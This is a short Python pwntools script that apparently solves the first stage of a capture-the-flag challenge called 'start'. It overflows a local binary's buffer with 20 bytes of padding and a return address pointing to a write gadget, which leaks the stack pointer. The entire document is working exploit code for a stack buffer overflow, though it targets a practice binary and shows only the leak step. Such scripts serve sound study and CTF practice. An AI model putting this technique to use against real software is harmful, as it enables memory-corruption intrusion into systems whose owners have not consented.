from pwn import *

def leak_esp(r):
	address_1 = p32(0x08048087)             # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
	payload = 'A'*20 + address_1
	print r.recvuntil('CTF:')
	r.send(payload)
	return hex(r.recv())
p = process("./start")
print leak_esp(p)